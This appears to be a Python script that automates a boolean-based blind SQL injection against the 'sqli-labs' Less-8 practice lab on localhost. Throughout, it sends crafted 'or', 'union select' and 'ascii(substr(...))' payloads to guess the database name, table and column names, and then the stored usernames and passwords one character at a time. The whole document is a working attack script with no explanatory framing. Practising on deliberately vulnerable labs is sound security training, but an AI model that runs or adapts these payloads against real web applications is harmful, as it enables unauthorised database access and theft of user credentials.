import requests

url = "http://localhost/sqli-labs-php7/Less-8/?id=0' "
fact="You are in..........."

dblen=0
for i in range(100):
    length = url + "or length(database())=" + str(i) + "-- -"
    result=requests.get(length)
    if fact in result.text:
        print("Length Of DataBase")
        print (i)
        dblen=i
        break

flag=''
print("DataBase Name")
for i in range(1,1+dblen):
    for j in range(42,122):
        name = url + "or ascii(substr(database(),"+str(i)+",1))="+str(j)+" -- -"
        result=requests.get(name)
        if fact in result.text:
            flag=flag+chr(j)
            print (flag)
            
dblen=0
for i in range(100):
    length = url + "union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() having length(group_concat(table_name))="+str(i)+"-- -"
    result=requests.get(length)
    if fact in result.text:
        print("Length Of TableNames")
        print (i)
        dblen=i
        break
        
flag=''
print("Available Tables")
for i in range(1,1+dblen):
    for j in range(42,122):
        name = url + " union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() having ascii(substr(group_concat(table_name),"+str(i)+",1))="+str(j)+" -- -"
        result=requests.get(name)
        if fact in result.text:
            flag=flag+chr(j)
            print(flag)

dblen=0
for i in range(100):
    length=url + "union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' having length(group_concat(column_name))="+str(i)+"-- -"
    result=requests.get(length)
    if fact in result.text:
        dblen=i
        print(i)
        break

flag=''
for i in range(1,1+dblen):
    for j in range(42,122):
        name=url + "union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' having ascii(substr(group_concat(column_name),"+str(i)+",1))="+str(j)+" -- -"
        result=requests.get(name)
        if fact in result.text:
            flag=flag+chr(j)
            print(flag)
          
print("G E T T I N G    U S E R N A M E S")  
dblen=0
for i in range(150):
    length=url+"union select 1,2,(group_concat(username)) from users having length(group_concat(username))="+str(i)+"-- -"
    result=requests.get(length)
    if fact in result.text:
        print(i)
        dblen=i
        break
        
flag=''
for i in range(1,1+dblen):
    for j in range(42,122):
        name=url + "union select 1,2,group_concat(username) from users having ascii(substr(group_concat(username),"+str(i)+",1))="+str(j)+"-- -"
        result=requests.get(name)
        if fact in result.text:
            flag=flag+chr(j)
            print(flag)
            
print("G E T T I N G    P A S S W O R D S")
dblen=0
for i in range(150):
    length=url+"union select 1,2,(group_concat(password)) from users having length(group_concat(password))="+str(i)+"-- -"
    result=requests.get(length)
    if fact in result.text:
        print(i)
        dblen=i
        break
        
flag=''
for i in range(1,1+dblen):
    for j in range(42,122):
        name=url + "union select 1,2,group_concat(password) from users having ascii(substr(group_concat(password),"+str(i)+",1))="+str(j)+"-- -"
        result=requests.get(name)
        if fact in result.text:
            flag=flag+chr(j)
            print(flag)
